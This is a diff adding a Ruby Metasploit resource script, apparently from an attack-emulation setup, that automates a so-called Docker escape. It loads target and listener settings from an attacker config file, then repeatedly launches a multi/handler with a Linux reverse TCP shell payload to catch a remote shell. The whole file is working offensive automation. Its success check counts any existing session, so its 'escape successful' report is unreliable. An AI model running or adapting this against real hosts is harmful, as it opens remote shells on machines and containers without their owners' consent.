@@ -1,0 +1,55 @@
+require "json"
+
+def initialize_from_json(json_data)
+  # Set workspace name from config file
+  framework.datastore["TARGET_IP"] = json_data["TARGET_IP"]
+  framework.datastore["TARGET_PORT"] = json_data["TARGET_PORT"]
+  framework.datastore["LISTENING_IP"] = json_data["LISTENING_IP"]
+  framework.datastore["LPORT"] = json_data["LPORT"]
+end
+
+datastore = framework.datastore
+
+# Read configuration from JSON file
+json_file = File.read("/data/attacker/custom_attacks/docker_escape/config_rc.json")
+json_data = JSON.parse(json_file)
+datastore["WORKSPACE"] = json_data["WORKSPACE"]
+
+# Delete workspace with the same name if it already exists
+run_single("workspace -d #{datastore['WORKSPACE']}")
+# Set workspace to the selected one in config file
+run_single("workspace -a #{datastore['WORKSPACE']}")
+print_status "USING WORKSPACE #{datastore['WORKSPACE']}"
+initialize_from_json(json_data)
+
+# Set up and execute docker escape attack
+attempt = 0
+max_attempts = 5
+success = false
+
+while attempt < max_attempts && !success
+  print_status "Attempting docker escape, attempt number: #{attempt + 1}"
+  attempt += 1
+
+  run_single("use exploit/multi/handler")
+  run_single("set payload linux/x86/shell_reverse_tcp")
+  run_single("set LHOST #{datastore['LISTENING_IP']}")
+  run_single("set LPORT #{datastore['LPORT']}")
+  run_single("exploit -j -z")
+
+  # Wait for the handler to create a session
+  Rex.sleep(10)
+
+  # Check if a new session has been created
+  new_sessions = framework.sessions.keys
+  if new_sessions.length > 0
+    print_status "Docker escape successful!"
+    success = true
+  else
+    print_error "Docker escape attempt #{attempt} failed, retrying..."
+  end
+end
+
+if !success
+  print_error "All docker escape attempts failed."
+end
